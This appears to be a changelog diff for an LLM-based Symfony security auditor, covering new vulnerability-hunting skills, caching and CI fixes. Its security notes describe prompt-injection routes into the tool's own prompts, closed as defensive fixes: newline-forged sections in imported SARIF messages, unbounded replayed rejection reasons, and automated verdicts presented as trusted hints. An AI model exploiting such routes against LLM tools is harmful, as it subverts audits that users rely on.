-  Admin and EasyAdmin panels.** Three new dedicated `ProjectFileType` cases
-  route to `LdapServiceAttackerSkill`, `SonataAdminAttackerSkill`, and
-  `ControllerEasyAdminAttackerSkill`, which flag unescaped LDAP filter/DN
-  concatenation, admin panels exposing a privileged field (`roles`, `password`,
-  `isAdmin`) or missing per-object access control, and EasyAdmin actions left
-  unscoped by `->setPermission()`. On SonataAdminBundle 4.x, `checkAccess()`/
-  `hasAccess()` are `final`, so the skill looks for a dedicated Security Voter
-  instead of an overridden `checkAccess()`. `RegexStaticPreScanner` gained six
-  matching risk markers (`CACHE_VERSION` bumped to 30). Implementation lives in
-  `src/Audit/Domain/Model/ProjectFileType.php` and
-  `src/Audit/Infrastructure/Prompt/Skill/`.
-
-- **The attacker now hunts permissive Mercure topic scopes.** A new
-  `VulnerabilityType::PERMISSIVE_MERCURE_TOPIC_SELECTOR` (CWE-1220) covers a JWT
-  `publish`/`subscribe` claim scoped to `'*'`; two new `RegexStaticPreScanner`
-  markers flag the recipe's default JWT secret placeholder and a wildcard topic
-  claim. Implementation lives in
-  `src/Audit/Infrastructure/Prompt/Skill/ConfigAttackerSkill.php` and
-  `src/Audit/Infrastructure/Scan/RegexStaticPreScanner.php`.
-
-### Fixed
-
-- **The new `audit.triage_memory` constructor argument no longer breaks a 1.15.0
-  positional caller of `AuditExecutionConfiguration`.** The argument was
-  inserted mid-signature (before `failOn`), shifting the positional slots of
-  `failOn`/`excludedTypes`/`includedTypes`/`customSkills` — a BC break for a
-  public `Audit\Domain\Configuration\*` value object (see `docs/versioning.md`).
-  It is now appended after `customSkills`/`sinceClosure`, restoring the 1.15.0
-  positional signature.
-- **Imported SARIF taint paths now mark dropped steps with an `...` ellipsis
-  instead of silently misattributing the source.** `SarifImportingPreScanner`
-  drops taint-flow steps that point outside the scan surface; with the leading
-  step(s) dropped, the first surviving step was presented to the attacker as the
-  taint _source_ (and a single-surviving-step flow as a full path), so the
-  rendered evidence was misleading. Gaps now render as `... -> src/Sink.php:42`
-  (leading), `src/Source.php:1 -> ... -> src/Sink.php:42` (internal) and
-  `src/Source.php:1 -> ...` (trailing).
-- **Enabling `audit.triage_memory` no longer silently disables the reviewer
-  verdict cache.** The reviewer cache key folds in a digest of the feedback set
-  (`ReviewerFeedback::digest()`), and `CompositeReviewerFeedbackProvider`
-  re-read the triage-memory file live on every lookup. Because the reviewer
-  _writes_ that file mid-run (each rejection appends an entry), the digest
-  shifted between findings within a single run, so every verdict after the first
-  missed its own freshly-written cache entry — and a cache _hit_ re-wrote the
-  file too, compounding the churn. The composite now snapshots the merged
-  feedback once per run, and `ReviewerFeedback::digest()` is order-independent,
-  so a stable set produces a stable key. Two remaining sources of cross-run
-  churn are also closed: `FilesystemTriageMemoryStore` now keeps the **first**
-  reason recorded for a finding instead of overwriting it with each run's
-  freshly-worded notes (a rewritten reason changed the digest every run, so the
-  cache never converged), and the per-run snapshot is now discarded at the start
-  of each run via `ReviewerFeedbackSnapshotInterface::resetForNewRun()` (called
-  from `RunAuditUseCase::execute()`) — previously the `??=` memo lived for the
-  whole process, so a long-lived process (`mcp:serve`) served the first audit's
-  frozen feedback to every later audit. The cache is functional again with
-  triage memory on: findings are re-reviewed once after the feedback set grows,
-  then served from cache, run after run.
-- **`audit.triage_memory` no longer leaks one project's rejections into another
-  project's review, and now records rejections in every review mode.** The
-  memory file lived at a single `<cache.dir>/triage-memory.json` with entries
-  keyed only by type+file+title+line, so under a shared (user-global) cache
-  directory — the standalone binary's default — two projects with a same-named
-  file (`src/Controller/UserController.php`) cross-contaminated: project A's
-  rejection was surfaced to project B's reviewer as a "known false positive for
-  this project" and its title/notes were sent to B's configured LLM provider,
-  and a matching key silently overwrote the other's entry.
-  `FilesystemTriageMemoryStore` now writes one file per audited project under
-  `<cache.dir>/triage-memory/` (keyed by a hash of the project path).
-  Separately, a reviewer rejection produced by batch mode
-  (`audit.reviewer_batch_size > 1`) was applied by `BatchVerdictApplier`, which
-  bypassed `ReviewOutcomeRecorder` and so never recorded the rejection to triage
-  memory — the opt-in feature did nothing in batch mode. Both fresh-verdict
-  paths now route the rejection through the shared `RejectionTriageRecorder`, so
-  every review mode records consistently.
-- **The release's new attacker skills are now actually wired into the audit.**
-  `TrustBoundaryAttackerSkill`, `ControllerTrustBoundaryAttackerSkill`,
-  `LdapServiceAttackerSkill`, `SonataAdminAttackerSkill`, and
-  `ControllerEasyAdminAttackerSkill` were added only to
-  `AttackerSkillRegistry::defaultSkills()` (the null-constructed fallback used
-  in unit tests) but never `set()` in `config/services.php`, so the DI-tagged
-  registry the shipped bundle and standalone binary build omitted them entirely
-  — the advertised LDAP/Sonata/EasyAdmin/trust-boundary hunts, and (for the new
-  file types) any skill block at all, never reached the attacker prompt. All
-  five are now registered, and a bundle integration test asserts the DI-built
-  registry renders exactly the built-in set so a future skill cannot regress the
-  same way.
-- **`ProjectFileTypeClassifier` no longer misroutes plain classes into the new
-  panel/LDAP file types.** A controller named `*CrudController.php` was
-  classified `EASYADMIN_CRUD` on filename alone — losing the generic controller
-  attack skills and dropping out of the no-voter-controllers mapping — even with
-  no EasyAdmin base class; classification now requires the content signal
-  (`extends AbstractCrudController` / `implements CrudControllerInterface`).
-  Likewise a message handler, event subscriber, normalizer, or scheduler that
-  merely referenced the Symfony LDAP component was reclassified `LDAP_SERVICE`
-  before its own attribute-verified arm ran; the LDAP/Sonata arms now sit after
-  those precise types, and the LDAP content sniff requires the LDAP _client_
-  (`Symfony\Component\Ldap\Ldap`) rather than any `Symfony\Component\Ldap`
-  import.
-- **The `trusted_proxies_wildcard` and `hsts_disabled` pre-scan markers are more
-  accurate.** `trusted_proxies_wildcard` only matched a wildcard CIDR placed
-  immediately after the key, missing the common `trusted_proxies: ['0.0.0.0/0']`
-  flow-array, block-list, and `'REMOTE_ADDR,0.0.0.0/0'` appended forms; it now
-  matches all of them. `hsts_disabled` matched an `enabled: false` belonging to
-  any sibling section within 100 characters of `forced_ssl`, so a correctly
-  hardened `forced_ssl: { enabled: true }` followed by a disabled `csp:` was
-  flagged as HSTS-off; it now only fires when the `enabled: false` is a child of
-  the `forced_ssl` block (or its inline map), and the block-matching pattern
-  uses possessive quantifiers so a large `forced_ssl` block can no longer
-  exhaust PCRE's backtrack limit and abort the file scan.
-  `RegexStaticPreScanner`'s `CACHE_VERSION` is bumped to 31.
-- **A YAML config file with numeric top-level keys no longer crashes the
-  audit.** `SymfonyYamlSecurityConfigParser::securitySections()` passed every
-  top-level key to `securityBlockOf(string $key, …)`, so a document like
-  `1: { question: … }` produced `int` keys and a fatal
-  `TypeError: Argument #1 ($key) must be of type string, int given` before any
-  LLM call (reported for the standalone binary in
-  [#187](https://github.com/vinceAmstoutz/symfony-security-auditor/issues/187)).
-  Non-string keys are now skipped, so a config carrying no `security` block is
-  ignored as intended.
-- **Triage-memory feedback is no longer mislabeled as maintainer-authored, and
-  its newest entries are surfaced first.** The reviewer system prompt presented
-  every feedback entry as a “Maintainer-accepted finding from this project's
-  baseline” and told the model to “treat each reason as a trusted hint”, even
-  though triage entries are the reviewer's _own_ prior-run rejections that a
-  later commit may have invalidated
-  (`ReviewerPromptBuilder::feedbackSection()`). The heading now states the
-  entries come from the baseline and/or earlier automated reviews, that the
-  reasons are **not authoritative**, and that the code may since have changed.
-  The prompt keeps only the first `MAX_FEEDBACK_PROMPT_ENTRIES` (20) entries,
-  and `FilesystemTriageMemoryStore` yielded them oldest-first, so the most
-  recent — most relevant — rejections were never shown once 20 accumulated;
-  feedback is now surfaced newest-first.
-- **A reviewer-rejection reason persisted to triage memory is now length-capped
-  (`FilesystemTriageMemoryStore::MAX_REASON_LENGTH`, 5000 chars).** In the JSON
-  review path the reason was persisted and replayed into later runs' system
-  prompts with no bound, an unbounded cross-run prompt-injection surface for a
-  hostile audited repository; the structured path's schema cap now applies to
-  both paths.
-- **Triage-memory entries are now keyed by line, so two distinct findings that
-  share a type/file/title no longer overwrite each other.**
-  `FilesystemTriageMemoryStore` deduplicated entries by `type + file + title`
-  only, so a second finding reusing a generic title in the same file (e.g. two
-  `Possible SQLi` hits at different lines) silently replaced the first's stored
-  reason. The finding's `lineStart` is now part of the key
-  (`TriageMemoryRecorderInterface::record()` gained a `$line` argument), so
-  distinct locations are remembered independently.
-- **The GitHub Action now writes its step outputs even when the audit fails.**
-  The `Run security audit` step's `set -uo pipefail` did not clear the errexit
-  (`-e`) GitHub injects into composite `bash` steps, so a non-zero audit exit —
-  the fail-on gate (1) or budget abort (2), the very cases the outputs exist to
-  report — aborted the step before the `$GITHUB_OUTPUT` writes. `exit-code`
-  could therefore only ever be `0` or empty and `findings-count` /
-  `highest-severity` were never set on a failing run. The audit exit code is now
-  captured with `|| exit_code=$?` so every output is written before the step
-  exits with the audit's real code.
-- **The GitHub Action's `standalone` mode now respects the pinned action version
-  instead of always running `main`.** The install step piped `install.sh` from
-  `main` (`raw.githubusercontent.com/.../main/install.sh`) and never set
-  `SSA_VERSION`, so a workflow pinned to `@<tag>`/`@<sha>` still executed
-  whatever `install.sh` was on `main` and installed the latest release binary.
-  It now runs the `install.sh` from the action's own checkout
-  (`$GITHUB_ACTION_PATH`) and, when pinned to a release tag, installs that exact
-  version's binary (branch/sha pins fall back to the latest release, since no
-  binary is published per arbitrary ref).
-- **`self-update` no longer risks destroying the PHP interpreter when run
-  outside the standalone binary.** `RunningBinaryLocator::path()`
-  (`src/Audit/Infrastructure/SelfUpdate/RunningBinaryLocator.php`) returned
-  `readlink('/proc/self/exe')` unconditionally, which under a normal PHP
-  interpreter resolves to the interpreter itself (e.g. `/usr/bin/php`), so
-  `symfony-security-auditor self-update` invoked as `php bin/…​ self-update` (or
-  via `docker compose exec php`) would download the release binary, pass
-  checksum verification, and rename it over the running `php` — bricking the
-  interpreter while reporting `Updated …`. The locator now refuses unless it is
-  running as the self-contained standalone binary (the phpmicro `micro` SAPI),
-  throwing a `self-update is only supported for the standalone binary …` error
-  that names the offending PHP SAPI instead.
-- **`self-update` can no longer hang forever on a stalled network.**
-  `ProcessReleaseClient::defaultProcessBuilder()` disabled the Symfony `Process`
-  timeout (`setTimeout(null)`) while its `curl` invocation carried no transfer
-  bound, so a blackholed connection blocked the command indefinitely with no
-  output. `curl` now runs with `--connect-timeout 30 --max-time 600` and the
-  process carries a finite backstop timeout.
-- **`self-update` no longer races concurrent runs onto a predictable download
-  path.** The download target was a fixed `dirname/.{asset}.download` shared by
-  every invocation (`SelfUpdater::replaceBinary()`), so overlapping runs could
-  install a partially-written, checksum-unverified binary, and a failure between
-  download and rename stranded a ~50 MB dotfile. The download now goes to a
-  unique per-run temporary file (`Filesystem::tempnam()`), and every failure
-  path — including a failed checksum _fetch_ — removes it.
-- **The native Windows binary is published with releases again.**
-  `windows-latest` lost VS 2022 in GitHub's June 2026 image migration, so
-  `static-php-cli` 2.8.5's doctor aborted before installing the `7za.exe` its
-  source extraction needs, and the tolerated failure surfaced later as
-  "`preg_match(): Argument #2 ($subject) must be of type string, false given`"
-  in `SourcePatcher::patchPhpLibxml212`. The release workflow now pins the
-  Windows leg to `windows-2022`, makes doctor failures fatal, hands spc's
-  extraction Windows bsdtar instead of MSYS tar, and fails fast when the php-src
-  tree is missing — the leg is blocking again instead of best-effort.
-
-### Security
-
-- **Imported SARIF marker descriptions and patterns can no longer forge fake
-  prompt sections in the attacker context.** `AttackerContextPromptRenderer`
-  newline-sanitized the risk-marker _file path_ but injected the marker
-  `description()` (e.g. imported SARIF `message.text`) and `pattern()` verbatim,
-  so an embedded newline in a CI-supplied SARIF message could inject an
-  unguarded `##`-prefixed section into the next iteration's attacker prompt.
-  Every marker field routed into the prompt is now collapsed to a single line.
-- **The release build verifies the checksum of its Launchpad `.deb` fallback
-  before installing it.** When apt fails, the release workflow
-  (`.github/workflows/release.yaml`) fetches pinned `re2c`/`autopoint` `.deb`s
-  straight from Launchpad and `dpkg -i`’d them, bypassing APT’s GPG signature
-  chain with no integrity check — a TLS-interception or CDN compromise could
-  place attacker-controlled build tools into the toolchain that compiles the
-  published binaries. Each `.deb` is now pinned to the SHA-256 published in
-  Ubuntu’s signed `noble` `Packages` index and verified with `sha256sum -c`
-  before install; a mismatch aborts the build.
+- Cached attacker answers refresh once after upgrading ([#172](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/172), [#175](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/175), [#180](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/180), [#188](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/188))
+- `symfony/ai-bundle` requirement moves to `^0.11` ([#179](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/179))
+- `Vulnerability::of()` accepts an optional `detectedAt` timestamp, defaulting to the current time ([#185](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/185))
+- `ReviewerFeedbackProviderInterface` is now composable and the new `TriageMemoryRecorderInterface` joins it as a documented extension point ([#177](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/177))
+- Imported SARIF marker text is collapsed to a single line before it reaches the attacker prompt, so a crafted message cannot inject a fake prompt section ([#184](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/184))
+- The release build verifies the SHA-256 of its Launchpad `.deb` fallback before installing it ([#184](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/184))
 
 ## [1.15.0] — 2026-07-14 — Conduit
 
-A release about reaching the auditor from anywhere. The new `mcp:serve` command
-exposes the audit as a Model Context Protocol tool, so an MCP client can run it
-on demand over the same pipeline as `audit:run`. Alongside it, the standalone
-binary's `init` now resolves the provider bridge for its own bundled PHP, so a
-fresh install no longer aborts on a host-versus-binary PHP mismatch.
+### New Features ✨
 
-### Added
+- `bin/console mcp:serve` runs a Model Context Protocol server over stdio that exposes an `audit` tool taking a project `path` and returning the JSON report, so an MCP client such as Claude Desktop or an IDE agent can run a full audit through the same pipeline as `audit:run` ([#162](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/162))
 
-- **New `mcp:serve` command runs a Model Context Protocol (MCP) server, exposing
-  the auditor as a tool to AI assistants.** `bin/console mcp:serve` starts an
-  [MCP](https://modelcontextprotocol.io) server over stdio — built on the
-  official [`mcp/sdk`](https://github.com/modelcontextprotocol/php-sdk) — that
-  advertises an `audit` tool taking a project `path` and returning the JSON
-  vulnerability report, so an MCP client (Claude Desktop, an IDE agent, …) can
-  run a full audit on demand through the same pipeline `audit:run` uses. The
-  server building lives in `src/Command/Mcp/` behind `McpServerFactoryInterface`
-  and `McpTransportFactoryInterface`; the audit runs with the bundle's
-  configured platform, models, and profile. See
-  [CLI Reference → `mcp:serve`](docs/configuration.md#mcpserve--model-context-protocol-server).
+### Bugfixes 🐛
 
-### Fixed
-
-- **The standalone binary's `init` now installs a provider bridge that its own
-  bundled PHP can load.** `ComposerBridgeInstaller` ran `composer require`
-  without constraining the platform, so the bridge tree resolved against the
-  _host's_ PHP (e.g. 8.5) and pulled dependencies requiring PHP `>= 8.4`. The
-  binary — which bundles PHP 8.3 — then aborted at startup in
-  `vendor/composer/platform_check.php`, since the resolved dependencies required
-  a newer PHP than the binary runs. The generated `composer.json` now pins
-  `config.platform.php` to the running runtime's version (`PHP_VERSION`, the
-  binary's bundled PHP), so `composer require` resolves versions the binary can
-  actually run.
+- The standalone binary's `init` installs a provider bridge its own bundled PHP can load, instead of resolving dependencies against the host's PHP and aborting at startup ([#164](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/164))
 
 ## [1.14.0] — 2026-07-14 — Beacon
 
-A release about sharper signals in and more actionable output out. External SAST
-results now feed the attacker through SARIF import, and projects can teach it
-new attack surfaces from configuration alone — no PHP required. On the way out,
-every finding carries a heuristic CVSS v4.0 score for triage, findings at or
-above the configured floor gain a suggested-fix patch, and `audit:trend` renders
-a self-contained HTML dashboard. Baselines get smarter too: their `reason`
-annotations now coach the reviewer, and the new `audit:baseline` command
-maintains them from a report without spending a token. The standalone macOS
-binaries ship under the clearer `macos` name, and the standalone `init` command
-now installs the correct provider bridge for every platform and stays writable
-in non-root containers via the new `SYMFONY_SECURITY_AUDITOR_HOME` override.
+### New Features ✨
 
-### Added
+- `audit:trend --format=html` renders the finding-count timeline as a single self-contained HTML page with a line chart and a table of each report's total and new/fixed deltas ([#146](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/146))
+- `audit:baseline report.json [baseline.json]` maintains the accepted-finding baseline from an existing JSON report without an LLM run: existing entries and their `reason` stay, only uncovered findings are appended, `--prune` drops entries whose findings are gone and `--annotate` asks a reason for each new one ([#148](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/148))
+- `audit:trend` tracks finding counts across two or more JSON reports, showing each report's total and how many findings appeared and disappeared since the previous one, as a console timeline or with `--format=json` ([#136](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/136))
+- A baseline entry's `reason` teaches the reviewer: reasons from the effective baseline (`--baseline` or `audit.baseline`, 20 entries max) are given as maintainer-trusted hints, without letting it reject a finding merely because it resembles an accepted one, and editing a `reason` re-reviews the affected findings; `ReviewerFeedbackProviderInterface` lets integrators plug in other sources ([#137](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/137))
+- `scan.import_sarif` imports SARIF 2.1.0 reports from tools such as Psalm, PHPStan, Progpilot or Semgrep as attacker risk markers at their file and line, with relative paths resolved from the project root and a missing or malformed file aborting the audit ([#138](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/138))
+- `audit.custom_skills` adds attacker skills from configuration alone, each with a `file_type` bucket, free-form `instructions` and an optional `priority`, merged into the prompt whenever a file of that type is in the chunk ([#139](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/139))
+- `audit.fix_synthesis.enabled` attaches a suggested unified-diff patch, in the new `suggested_fix` JSON field and in the console, Markdown and HTML reports, to each validated finding at or above `audit.fix_synthesis.severity_floor` (default `high`); it is off by default ([#140](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/140))
+- Every finding carries a heuristic CVSS v4.0 estimate in a `cvss` object (`version`, `vector`, `base_score`) in JSON, and in SARIF as `security-severity` plus a `cvssV4_0Vector` property ([#141](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/141))
+- `SYMFONY_SECURITY_AUDITOR_HOME` redirects the standalone binary's config, cache and bridge directories to a writable folder, outranking the XDG variables and `$HOME`, and a failed config write now names it as the way out ([#161](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/161))
 
-- **`audit:trend` can now render its timeline as a self-contained HTML
-  dashboard.** `audit:trend --format=html` emits a single HTML page — no
-  external assets, light and dark mode — with an SVG line chart of finding
-  totals across the report series and a table of each report's total plus its
-  new/fixed deltas, ready to redirect to a file and publish
-  (`audit:trend nightly-*.json --format=html > trend.html`). Rendering lives in
-  the new `src/Command/TrendHtmlRenderer.php` behind
-  `TrendHtmlRendererInterface`; report paths are HTML-escaped and stripped of
-  bidi-override characters, and — exactly as with `--format=json` — error
-  messages move to stderr so stdout carries the document alone. See
-  [CLI Reference → `audit:trend`](docs/configuration.md#audittrend--tracking-findings-across-reports).
-- **New `audit:baseline` command maintains the accepted-finding baseline from an
-  existing JSON report — no LLM run required.** Accepting a finding used to mean
-  either hand-editing the baseline or re-running a full (paid) audit with
-  `--generate-baseline`, which also overwrites the file and loses hand-written
-  `reason` annotations. `audit:baseline report.json [baseline.json]` merges
-  instead: existing entries are preserved verbatim — reasons survive — and only
-  findings not yet covered by an entry are appended (matching is count-aware and
-  honors `attacker_fingerprint`, the same rules the audit itself applies).
-  `--prune` drops entries whose findings left the report, and `--annotate` asks
-  a reason for each newly accepted finding, feeding the reviewer-teaching
-  feedback loop. See `src/Command/BaselineCommand.php`, the extracted
-  `ReportFindingsLoader` shared with `audit:diff`, and
-  [CLI Reference → `audit:baseline`](docs/configuration.md#auditbaseline--maintaining-the-accepted-finding-baseline).
+### Breaking Changes 💥
 
-- **New `audit:trend` command tracks how finding counts evolve across a series
-  of reports.** Given two or more JSON reports produced by
-  `audit:run --format=json` (ordered oldest to newest), each consecutive pair is
-  compared by the same stable `SSA-` fingerprint identity `audit:diff` uses, and
-  every report's line shows its total finding count plus how many findings
-  appeared and disappeared since the report before it — as a console timeline
-  or, with `--format=json`, a machine-readable `points` array. See
-  `src/Command/TrendCommand.php` and
-  [CLI Reference → `audit:trend`](docs/configuration.md#audittrend--tracking-findings-across-reports).
-- **Baseline `reason` annotations now teach the reviewer.** A baseline entry's
-  free-form `reason` key — previously documentation-only — is loaded from the
-  effective baseline file (`--baseline` CLI override or `audit.baseline`) and
-  injected into the reviewer's system prompt as maintainer-trusted
-  false-positive feedback (capped at 20 entries), so the skeptical reviewer
-  recognizes the named mitigating control when judging similar findings instead
-  of re-flagging the same pattern run after run. The prompt explicitly forbids
-  rejecting a finding solely because it resembles an accepted one — the reviewer
-  must verify the named control applies. Reviewer-verdict cache keys
-  (`FilesystemReviewerCache`) fold in a digest of the feedback, so adding or
-  editing a `reason` re-reviews affected findings while reason-free runs keep
-  every previously cached verdict byte-identical. A new
-  `ReviewerFeedbackProviderInterface` Domain port (with the
-  `ReviewerFeedback`/`AcceptedFindingFeedback` models) lets integrators plug in
-  custom feedback sources.
-- **External SAST results now feed the attacker via SARIF import.** The new
-  `scan.import_sarif` config key takes paths to SARIF 2.1.0 report files
-  produced by taint-tracking tools (Psalm, PHPStan, Progpilot, Semgrep, …); each
-  result is imported as a deterministic `sarif:<tool>:<rule>` risk marker at its
-  file and line (`SarifImportingPreScanner` decorating the configured
-  pre-scanner), so the attacker starts from the external tool's concrete leads
-  and lean mode keeps every externally-flagged file. Relative paths resolve
-  against the audited project root, imports work even with
-  `audit.static_prescan.enabled: false`, results pointing outside the scan
-  surface are dropped, and a missing or malformed file aborts the audit with
-  `"...does not exist or is not readable"` / `"...is not valid JSON"` instead of
-  silently auditing without the imported signal.
-- **Projects can now add attacker skills from configuration, no PHP required.**
-  The new `audit.custom_skills` key takes named skill blocks — each with a
-  `file_type` bucket, free-form `instructions`, and an optional `priority` —
-  merged into the attacker prompt beside the built-in skills whenever a file of
-  that type appears in the chunk (`ConfiguredAttackerSkill` collected by the
-  existing `AttackerSkillRegistry` tagged iterator). Standalone-binary users can
-  encode company-specific rules ("all queries to `LegacyDb` must go through
-  `SafeQuery`") that previously required implementing `AttackerSkillInterface`
-  in a bundle. Editing a skill's bucket, priority, or instructions re-runs the
-  affected attacker chunks (folded into the attacker cache key); an unconfigured
-  project's cache keys stay byte-identical to earlier releases.
-- **Fix synthesis attaches a suggested patch to each confirmed finding.** With
-  the new `audit.fix_synthesis.enabled` key on, a follow-up stage
-  (`FixSynthesisStage` + `FixSynthesizer`, mirroring the PoC synthesizer) asks
-  the reviewer model for a minimal unified-diff patch against the vulnerable
-  file for every validated finding at or above
-  `audit.fix_synthesis.severity_floor` (default `high`), surfaced as the new
-  `suggested_fix` field in JSON output and rendered in console, Markdown, and
-  HTML reports. The attacker's prose `remediation` is preserved — the patch is
-  additive. Off by default and, unlike PoC synthesis, not implied by any
-  profile; the synthesizer emits `NO_FIX: …` (and the finding keeps only its
-  prose remediation) when the issue needs a config change, a new class, or a
-  cross-cutting redesign rather than a localized patch.
-- **Every finding now carries a heuristic CVSS v4.0 estimate.** Alongside the
-  existing OWASP and CWE references, each finding exposes a `cvss` object
-  (`version`, `vector`, `base_score`) — a `CvssEstimate` derived from the
-  finding's type and reviewer-assigned severity: the base score is the
-  representative value of the severity's CVSS band and the exploitability/impact
-  metrics follow the type's category. It appears in JSON output and, in SARIF,
-  as each result's `security-severity` (the score GitHub Code Scanning ranks
-  alerts by) plus a `cvssV4_0Vector` property. This is an estimate for
-  triage/dashboards, not an analyst-scored vector.
+- Standalone macOS binaries are named `symfony-security-auditor-macos-x86_64` and `-macos-arm64` instead of `…-darwin-…`; `install.sh` picks the new name, so anyone hardcoding a download URL must switch `darwin` to `macos` ([#158](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/158))
 
-- **New `SYMFONY_SECURITY_AUDITOR_HOME` environment variable redirects the
-  standalone binary's config, cache, and bridge directories.** Container base
-  images that export `XDG_CONFIG_HOME` to a root-owned path (Caddy and
-  FrankenPHP both set it to `/config`) made `symfony-security-auditor init` fail
-  with `mkdir(): Permission denied` for a non-root user, with no way to point it
-  elsewhere. Setting `SYMFONY_SECURITY_AUDITOR_HOME` to a writable directory now
-  overrides the base location — it outranks the XDG variables and `$HOME`, so
-  `$SYMFONY_SECURITY_AUDITOR_HOME/.config`, `/.cache`, and `/.local/share`
-  become the roots. Resolution lives in
-  `XdgConfigPathResolver::fromEnvironment()`; see
-  [Standalone Configuration](docs/configuration.md#standalone-configuration).
+### Bugfixes 🐛
 
-### Changed
-
-- **Standalone macOS binaries are now named `…-macos-…` instead of
-  `…-darwin-…`.** The download assets and the `install.sh` OS detection use
-  `symfony-security-auditor-macos-x86_64` / `-macos-arm64`, matching the
-  human-facing "macOS" labels in the README and the platform name users expect
-  (`darwin` is the kernel name). `install.sh` selects the new name
-  automatically; anyone hardcoding a download URL should switch `darwin` →
-  `macos`. Linux and Windows asset names are unchanged. See
-  [`docs/versioning.md`](docs/versioning.md).
-
-### Fixed
-
-- **`symfony-security-auditor init` now installs the correct provider bridge for
-  platforms whose package slug is hyphenated.** The `symfony/ai` platform
-  _config_ key `openai` maps to the composer package
-  `symfony/ai-open-ai-platform` (note the hyphens), but `init` built the package
-  name straight from the config key and ran
-  `composer require symfony/ai-openai-platform`, which does not exist — so
-  choosing `openai` (as the prompt suggests) failed, and the `open-ai`
-  workaround wrote a `platform: open-ai` key `symfony/ai` then rejects.
-  `ComposerBridgeInstaller` now maps the config key to the package slug
-  (`openai` → `open-ai`, `deepseek` → `deep-seek`, `vertexai` → `vertex-ai`,
-  `openresponses` → `open-responses`, `huggingface` → `hugging-face`,
-  `elevenlabs` → `eleven-labs`, `amazeeai` → `amazee-ai`), so the config key the
-  audit needs and the package `init` installs finally agree.
-- **`init` no longer proposes an invalid API-key variable for hyphenated
-  provider names.** Deriving the default from a name like `open-ai` produced
-  `OPEN-AI_API_KEY`, which the shell rejects (`-` is not a valid identifier
-  character). `InitCommand` now strips non-alphanumeric characters when deriving
-  the default, yielding `OPENAI_API_KEY`.
-- **Config-write failures now tell you how to recover.** When `init` cannot
-  create the config file (e.g. a read-only or root-owned XDG directory in a
-  container), `StandaloneConfigWriteException` now names the
-  `SYMFONY_SECURITY_AUDITOR_HOME` override alongside the underlying error
-  instead of only reporting `mkdir(): Permission denied`.
+- `init` installs the right provider bridge for platforms with a hyphenated package slug (`openai` → `symfony/ai-open-ai-platform`, and likewise `deepseek`, `vertexai`, `openresponses`, `huggingface`, `elevenlabs`, `amazeeai`) ([#161](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/161))
+- `init` proposes a valid API-key variable for hyphenated provider names, such as `OPENAI_API_KEY` instead of `OPEN-AI_API_KEY` ([#161](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/161))
 
 ## [1.13.0] — 2026-07-12 — Groundtruth
 
-A precision release: the auditor's picture of the audited codebase now matches
-reality. Route, security, voter, and form parsing report the truth to the
-attacker LLM; the pre-scanner and code slicer recognize the multi-line and
-idiomatic forms of every construct they target; and four new attack surfaces —
-file uploads, Twig extensions, API Platform resources, and Symfony UX Live
-Components — are first-class. On top of that: findings carry CWE references,
-`audit:diff` compares two reports by fingerprint, JUnit and GitHub-annotation
-output formats land, the auditor ships as a standalone native binary, and LLM
-pricing comes from the daily `symfony/models-dev` catalog. No public API is
-removed or altered incompatibly — every change is additive, a bug fix, or an
-internal improvement.
+### New Features ✨
 
-### Added
+- File uploads are a first-class attack surface, with a dedicated pre-scan bucket, chunking slot and attacker-skill block ([#118](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/118))
+- Twig extensions are a first-class attack surface, with a dedicated pre-scan bucket, chunking slot and attacker-skill block ([#119](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/119))
+- API Platform `#[ApiResource]` resources are a first-class attack surface, with a dedicated pre-scan bucket, chunking slot and attacker-skill block ([#105](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/105))
+- Symfony UX Live Components are a first-class attack surface, with a dedicated pre-scan bucket, chunking slot and attacker-skill block ([#106](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/106))
+- Findings carry a CWE reference next to the OWASP mapping, shown in every report format and tagged `external/cwe/cwe-*` in SARIF ([#127](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/127))
+- OWASP references point at the Top 10:2025 edition instead of 2021 ([#98](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/98))
+- `audit:diff` compares two JSON reports and lists new, fixed and persisting findings by fingerprint ([#126](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/126))
+- Each finding in JSON output carries its stable `SSA-` `fingerprint`, the hash behind baselines and SARIF `partialFingerprints` ([#126](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/126))
+- `--format junit` renders findings as JUnit XML for CI test panels ([#100](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/100))
+- `--format github` renders findings as GitHub Actions annotations shown inline on a pull request's Files Changed view ([#122](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/122))
+- `audit:run --show-scanned` lists the exact files an audit would ingest without calling the LLM ([#87](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/87))
+- `security.yaml` is parsed with `symfony/yaml` instead of single-line regexes, so the access-control map the attacker reasons over is complete ([#104](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/104))
+- Committed dotenv files in the project root are part of the default scan surface, with deterministic secret markers ([#99](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/99))
+- Baselined findings skip the reviewer entirely, and the baseline file is human-readable ([#103](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/103))
